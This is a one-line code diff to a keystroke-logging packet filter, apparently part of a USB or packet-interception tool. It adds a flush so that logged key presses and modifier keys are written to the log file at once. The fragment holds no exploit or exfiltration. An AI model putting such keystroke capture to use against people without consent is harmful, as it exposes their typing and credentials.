@@ -219,6 +219,7 @@ void PacketFilter_KeyLogger::keyPressed(__u8 keyCode,__u8 mods) {
 		if (mods & MOD_RALT)   { fprintf(file, fmt_colour, COL_BLUE, "{RALT}"); }
 		if (mods & MOD_RWIN)   { fprintf(file, fmt_colour, COL_BLUE, "{RWIN}"); }
 	}
+	fflush(file);
 }
 
 void PacketFilter_KeyLogger::filter_packet(Packet* packet) {
